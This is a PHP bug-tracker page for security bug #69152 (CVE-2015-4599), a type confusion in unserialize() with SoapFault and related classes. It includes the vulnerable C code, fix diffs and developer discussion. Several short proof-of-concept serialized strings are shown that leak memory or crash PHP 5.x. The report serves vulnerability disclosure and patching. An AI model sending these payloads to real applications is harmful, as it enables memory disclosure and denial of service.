<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
        <link rel='alternate' type='application/rss+xml' title='SOAP related Bug #69152 - RDF' href='rss/bug.php?id=69152'>
        <link rel='alternate' type='application/rss+xml' title='SOAP related Bug #69152 - RSS 2.0' href='rss/bug.php?id=69152&format=rss2'>
        <base href="https://bugs.php.net/">
    <title>PHP :: Sec Bug #69152 :: Type Confusion Infoleak Vulnerability in unserialize() with SoapFault</title>
    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
</head>

<body>

<table id="top" class="head" cellspacing="0" cellpadding="0">
    <tr>
        <td class="head-logo">
            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
        </td>

        <td class="head-menu">
            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
            <a href="random">random bug</a>&nbsp;|&nbsp;
            <a href="login.php">login</a>
        </td>
    </tr>

    <tr>
        <td class="head-search" colspan="2">
            <form method="get" action="search.php">
                <p class="head-search">
                    <input type="hidden" name="cmd" value="display">
                    <small>go to bug id or search bugs for</small>
                    <input class="small" type="text" name="search_for" value="" size="30">
                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
                </p>
            </form>
        </td>
    </tr>
</table>

<table class="middle" cellspacing="0" cellpadding="0">
    <tr>
        <td class="content">
<div id="bugheader">
    <table id="details">
        <tr id="title">
            <th class="details" id="number"><a href="bug.php?id=69152">Sec Bug</a>&nbsp;#69152</th>
            <td id="summary" colspan="5">Type Confusion Infoleak Vulnerability in unserialize() with SoapFault</td>
        </tr>
        <tr id="submission">
            <th class="details">Submitted:</th>
            <td style="white-space: nowrap;">2015-03-01 13:19 UTC</td>
            <th class="details">Modified:</th>
            <td style="white-space: nowrap;">2016-02-11 13:33 UTC</td>
            <td rowspan="6">


            </td>
        </tr>

        <tr id="submitter">
            <th class="details">From:</th>
            <td>taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</td>
            <th class="details">Assigned:</th>
            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
        </tr>

        <tr id="categorization">
            <th class="details">Status:</th>
            <td>Closed</td>
            <th class="details">Package:</th>
            <td><a href="search.php?cmd=display&amp;package_name[]=SOAP+related">SOAP related</a></td>
        </tr>

        <tr id="situation">
            <th class="details">PHP Version:</th>
            <td>5.6.6</td>
            <th class="details">OS:</th>
            <td>*</td>
        </tr>

        <tr id="private">
            <th class="details">Private report:</th>
            <td>No</td>
            <th class="details">CVE-ID:</th>
            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4599" target="_blank">2015-4599</a></td>
        </tr>
    </table>
</div>

<div class="controls">
<span id='control_0' class='control active'>View</span>
<span id='control_3' class='control'><a href='bug.php?id=69152&amp;edit=3'>Add Comment</a></span>
<span id='control_1' class='control'><a href='bug.php?id=69152&amp;edit=1'>Developer</a></span>
<span id='control_2' class='control'><a href='bug.php?id=69152&amp;edit=2'>Edit</a></span>
</div>
<div class="clear"></div>



<div class='comment type_comment' ><a name="1425215948">&nbsp;</a><strong>[2015-03-01 13:19 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>Description:
------------
PHP_METHOD(SoapFault, __toString)
{
...
	faultcode   = zend_read_property(soap_fault_class_entry, this_ptr, &quot;faultcode&quot;, sizeof(&quot;faultcode&quot;)-1, 1 TSRMLS_CC);
	faultstring = zend_read_property(soap_fault_class_entry, this_ptr, &quot;faultstring&quot;, sizeof(&quot;faultstring&quot;)-1, 1 TSRMLS_CC);
	file = zend_read_property(soap_fault_class_entry, this_ptr, &quot;file&quot;, sizeof(&quot;file&quot;)-1, 1 TSRMLS_CC);
	line = zend_read_property(soap_fault_class_entry, this_ptr, &quot;line&quot;, sizeof(&quot;line&quot;)-1, 1 TSRMLS_CC);
...
	len = spprintf(&amp;str, 0, &quot;SoapFault exception: [%s] %s in %s:%ld\nStack trace:\n%s&quot;,
	               Z_STRVAL_P(faultcode), Z_STRVAL_P(faultstring), Z_STRVAL_P(file), Z_LVAL_P(line),
	               Z_STRLEN_P(trace) ? Z_STRVAL_P(trace) : &quot;#0 {main}\n&quot;);

	zval_ptr_dtor(&amp;trace);

	RETURN_STRINGL(str, len, 0);
ÔΩù

The Z_STRVAL_P macro lead to looking up an arbitrary valid memory address, and return a string via a integer-type zval that start from this memory address.
If the memory address is an invalid memory position, it should result in a crash.
The Z_LVAL_P macro lead to leaking memory address via a string-type zval that string value stored.

The following code should leak arbitrary memory or crash PHP:

&lt;?php

$data = 'O:9:&quot;SoapFault&quot;:4:{s:9:&quot;faultcode&quot;;i:4298448493;s:11:&quot;faultstring&quot;;i:4298448543;s:7:&quot;'.&quot;\0*\0&quot;.'file&quot;;i:4298447319;s:7:&quot;'.&quot;\0*\0&quot;.'line&quot;;s:4:&quot;ryat&quot;;}';
echo unserialize($data);

?&gt;

Result(Test on standard MacOSX 10.10.2 installation of PHP 5.6.6.):

SoapFault exception: [UH??AWAVSPI??I??H????
 in UH??AWAVAUATSH???:4307253992           ] UH??SPD???*?????t&quot;H?
Stack trace:
#0 test.php(4): unserialize('O:9:&quot;SoapFault&quot;...')
#1 {main}


</pre>
</div><h2>Patches</h2>
<a href="patch-display.php?bug_id=69152&amp;patch=sorry_mistake&amp;revision=latest" >sorry_mistake</a>
(last revision 2016-06-02 04:49 UTC by hiroshi &#x64;&#111;&#x74; yanagisawa &#x61;&#116; fujixerox &#x64;&#111;&#x74; co &#x64;&#111;&#x74; jp)
<br><a href="patch-display.php?bug_id=69152&amp;patch=add-fronk-support&amp;revision=latest"  style="background-color: yellow; text-decoration: line-through;" >add-fronk-support</a>
(last revision 2016-06-02 04:39 UTC by hiroshi &#x64;&#111;&#x74; yanagisawa &#x61;&#116; fujixerox &#x64;&#111;&#x74; co &#x64;&#111;&#x74; jp)
<br><p><a href='patch-add.php?bug_id=69152'>Add a Patch</a></p><h2>Pull Requests</h2>
<p><a href='gh-pull-add.php?bug_id=69152'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
            <div id='comments_view' style='clear:both;'>
<div class='comment type_comment' ><a name="1425216259">&nbsp;</a><strong>[2015-03-01 13:24 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>The fix (available to PHP 5.5/5.6):

diff --git a/php-5.6.6/ext/soap/soap.c b/php-5.6.6-fixed/ext/soap/soap.c
index 6a250ba..ca87af7 100644
--- a/php-5.6.6/ext/soap/soap.c
+++ b/php-5.6.6-fixed/ext/soap/soap.c
@@ -917,6 +917,11 @@ PHP_METHOD(SoapFault, __toString)
 	faultstring = zend_read_property(soap_fault_class_entry, this_ptr, &quot;faultstring&quot;, sizeof(&quot;faultstring&quot;)-1, 1 TSRMLS_CC);
 	file = zend_read_property(soap_fault_class_entry, this_ptr, &quot;file&quot;, sizeof(&quot;file&quot;)-1, 1 TSRMLS_CC);
 	line = zend_read_property(soap_fault_class_entry, this_ptr, &quot;line&quot;, sizeof(&quot;line&quot;)-1, 1 TSRMLS_CC);
+	
+	convert_to_string(faultcode);
+	convert_to_string(faultstring);
+	convert_to_string(file);
+	convert_to_long(line);
 
 	ZVAL_STRINGL(&amp;fname, &quot;gettraceasstring&quot;, sizeof(&quot;gettraceasstring&quot;)-1, 0);
</pre>
</div><div class='comment type_comment' ><a name="1425223458">&nbsp;</a><strong>[2015-03-01 15:24 UTC] <a href="//people.php.net/laruence">laruence@php.net</a></strong>
<pre class='note'>in soap.c, there are some other codes like:

if (zend_hash_find(prop, &quot;faultcode&quot;, sizeof(&quot;faultcode&quot;), (void**)&amp;tmp) == SUCCESS) {


then use tmp as string later without any type check.

is that also could be a problem?
</pre>
</div><div class='comment type_comment' ><a name="1425271419">&nbsp;</a><strong>[2015-03-02 04:43 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>There are some similar bugs exists in other methods: SoapClient::__getLastRequest, SoapClient::__getLastResponse, SoapClient::__getLastRequestHeaders, SoapClient::__getLastResponseHeaders and etc.

PHP_METHOD(SoapClient, __getLastRequest)
{
	zval **tmp;
	
	if (zend_parse_parameters_none() == FAILURE) {
		return;
	}

	if (zend_hash_find(Z_OBJPROP_P(this_ptr), &quot;__last_request&quot;, sizeof(&quot;__last_request&quot;), (void **)&amp;tmp) == SUCCESS) {
		RETURN_STRINGL(Z_STRVAL_PP(tmp), Z_STRLEN_PP(tmp), 1);
	}
	RETURN_NULL();
}
</pre>
</div><div class='comment type_comment' ><a name="1425271913">&nbsp;</a><strong>[2015-03-02 04:51 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>There are some similar bugs exists in other methods, and these bugs leak to execute arbitrary code.

SoapClient::__getCookies/SoapClient::__setCookie

PHP_METHOD(SoapClient, __getCookies)
{
	zval **cookies, *tmp;

	if (zend_parse_parameters_none() == FAILURE) {
		return;
	}

	array_init(return_value);

	if (zend_hash_find(Z_OBJPROP_P(this_ptr), &quot;_cookies&quot;, sizeof(&quot;_cookies&quot;), (void **)&amp;cookies) != FAILURE) {
		zend_hash_copy(Z_ARRVAL_P(return_value), Z_ARRVAL_P(*cookies), (copy_ctor_func_t) zval_add_ref, (void *)&amp;tmp, sizeof(zval*));
	}
}
</pre>
</div><div class='comment type_comment' ><a name="1425275413">&nbsp;</a><strong>[2015-03-02 05:50 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>I think more correct solution would be to either have a unserialize handler on these classes or ban serialization of them altogether, since inserting conversion in each place doesn't look like a good way to handle it - too easy to miss something.
</pre>
</div><div class='comment type_comment' ><a name="1425357025">&nbsp;</a><strong>[2015-03-03 04:30 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>There is a similar bug exists in exception::getTraceAsString

ZEND_METHOD(exception, getTraceAsString)
{
	zval *trace;
	char *res, **str, *s_tmp;
	int res_len = 0, *len = &amp;res_len, num = 0;

	DEFAULT_0_PARAMS;
	
	res = estrdup(&quot;&quot;);
	str = &amp;res;

	trace = zend_read_property(default_exception_ce, getThis(), &quot;trace&quot;, sizeof(&quot;trace&quot;)-1, 1 TSRMLS_CC);
	zend_hash_apply_with_arguments(Z_ARRVAL_P(trace) TSRMLS_CC, (apply_func_args_t)_build_trace_string, 3, str, len, &amp;num);

I think that some similar bugs exists in other methods or functions. 
If you ban serialization of these classes, might break some features or webapp's code.
</pre>
</div><div class='comment type_comment' ><a name="1426863482">&nbsp;</a><strong>[2015-03-20 14:58 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>There is a similar bug exists in __PHP_Incomplete_Class:

```
PHPAPI char *php_lookup_class_name(zval *object, zend_uint *nlen)
{
	zval **val;
	char *retval = NULL;
	HashTable *object_properties;
	TSRMLS_FETCH();

	object_properties = Z_OBJPROP_P(object);

	if (zend_hash_find(object_properties, MAGIC_MEMBER, sizeof(MAGIC_MEMBER), (void **) &amp;val) == SUCCESS) {
		retval = estrndup(Z_STRVAL_PP(val), Z_STRLEN_PP(val));

		if (nlen) {
			*nlen = Z_STRLEN_PP(val);
		}
	}

	return retval;
}
...
static void incomplete_class_message(zval *object, int error_type TSRMLS_DC)
{
	char *class_name;
	zend_bool class_name_alloced = 1;

	class_name = php_lookup_class_name(object, NULL);

	if (!class_name) {
		class_name_alloced = 0;
		class_name = &quot;unknown&quot;;
	}

	php_error_docref(NULL TSRMLS_CC, error_type, INCOMPLETE_CLASS_MSG, class_name);

	if (class_name_alloced) {
		efree(class_name);
	}
}
...
PHPAPI zend_class_entry *php_create_incomplete_class(TSRMLS_D)
{
	zend_class_entry incomplete_class;

	INIT_CLASS_ENTRY(incomplete_class, INCOMPLETE_CLASS, NULL);
	incomplete_class.create_object = php_create_incomplete_object;

	memcpy(&amp;php_incomplete_object_handlers, &amp;std_object_handlers, sizeof(zend_object_handlers));
	php_incomplete_object_handlers.read_property = incomplete_class_get_property;
	php_incomplete_object_handlers.has_property = incomplete_class_has_property;
	php_incomplete_object_handlers.unset_property = incomplete_class_unset_property;
	php_incomplete_object_handlers.write_property = incomplete_class_write_property;
	php_incomplete_object_handlers.get_property_ptr_ptr = incomplete_class_get_property_ptr_ptr;
    php_incomplete_object_handlers.get_method = incomplete_class_get_method;

	return zend_register_internal_class(&amp;incomplete_class TSRMLS_CC);
}

The following code should leak memory block via an error message or crash PHP.

```
$x =  'O:4:&quot;test&quot;:1:{s:27:&quot;__PHP_Incomplete_Class_Name&quot;;R:1;}';
$z = unserialize($x);
$z-&gt;test();
```
</pre>
</div><div class='comment type_comment' ><a name="1427275586">&nbsp;</a><strong>[2015-03-25 09:26 UTC] <a href="//people.php.net/kaplan">kaplan@php.net</a></strong>
<pre class='note'><a href="http://git.php.net/?p=php-src.git;a=commitdiff;h=51856a76f87ecb24fe1385342be43610fb6c86e4" rel="nofollow">http://git.php.net/?p=php-src.git;a=commitdiff;h=51856a76f87ecb24fe1385342be43610fb6c86e4</a>
</pre>
</div><div class='comment type_comment' ><a name="1427277435">&nbsp;</a><strong>[2015-03-25 09:57 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>Some of these bugs has been fixed in latest PHP 5.4/5.5/5.6 series updates:

<a href="https://github.com/php/php-src/commit/0c136a2abd49298b66acb0cad504f0f972f5bfe8" rel="nofollow">https://github.com/php/php-src/commit/0c136a2abd49298b66acb0cad504f0f972f5bfe8</a>
<a href="https://github.com/php/php-src/commit/51856a76f87ecb24fe1385342be43610fb6c86e4" rel="nofollow">https://github.com/php/php-src/commit/51856a76f87ecb24fe1385342be43610fb6c86e4</a>

Some fix for these bugs has been committed:

<a href="https://github.com/php/php-src/commit/fb83c76deec58f1fab17c350f04c9f042e5977d1" rel="nofollow">https://github.com/php/php-src/commit/fb83c76deec58f1fab17c350f04c9f042e5977d1</a>

Some of these bugs has not been fixed:

exception::getTraceAsString

The following code should crash PHP

&lt;?php
$x = unserialize('O:9:&quot;exception&quot;:1:{s:16:&quot;'.&quot;\0&quot;.'Exception'.&quot;\0&quot;.'trace&quot;;s:4:&quot;ryat&quot;;}');
echo $x;
?&gt;
</pre>
</div><div class='comment type_comment' ><a name="1427279756">&nbsp;</a><strong>[2015-03-25 10:35 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>BTW, this type confusion vulnerability in exception::getTraceAsString can lead to execute arbitrary code.
</pre>
</div><div class='comment type_log' ><a name="1428297672">&nbsp;</a><strong>[2015-04-06 05:21 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Assigned To:</span>
<span class="added">+Assigned To: stas</span>
</div></div></div><div class='comment type_log' ><a name="1429216429">&nbsp;</a><strong>[2015-04-16 20:33 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Assigned</span>
<span class="added">+Status: Closed</span>
</div></div></div><div class='comment type_comment' ><a name="1429216429">&nbsp;</a><strong>[2015-04-16 20:33 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>The fix for this bug has been committed.

Snapshots of the sources are packaged every three hours; this change
will be in the next snapshot. You can grab the snapshot at
<a href="http://snaps.php.net/" rel="nofollow">http://snaps.php.net/</a>.

 For Windows:

<a href="http://windows.php.net/snapshots/" rel="nofollow">http://windows.php.net/snapshots/</a>
 
Thank you for the report, and for helping us make PHP better.

Should be fixed now. If new issues are identified in other code, please open a new bug.
</pre>
</div><div class='comment type_log' ><a name="1455197613">&nbsp;</a><strong>[2016-02-11 13:33 UTC] <a href="//people.php.net/kaplan">kaplan@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID:</span>
<span class="added">+CVE-ID: 2015-4599</span>
</div></div></div></div>
        </td>
    </tr>
</table>

<script src='js/util.js'></script>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
<script src="js/jquery.cookie.js"></script>
<script>
function do_comment(nd)
{
    $('#comment_filter > .control.active').removeClass("active");
    $(nd).addClass("active");

    $.cookie('history_tab', nd.id, { expires: 365 });

    if (nd.id == 'type_all') {
        $('#comments_view > .comment:hidden').show('slow');
    } else {
        $('#comments_view > .comment').each(function(i) {
            if ($(this).hasClass(nd.id)) {
                $(this).show('slow');
            } else {
                $(this).hide('slow');
            }
        });
    }
    return false;
}
</script>
<table class="foot" cellspacing="0" cellpadding="0">
    <tr>
        <td class="foot-bar" colspan="2">&nbsp;</td>
    </tr>

    <tr>
        <td class="foot-copy">
            <small>
                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
                All rights reserved.
            </small>
        </td>
        <td class="foot-source">
            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
        </td>
    </tr>
</table>
</body>
</html>
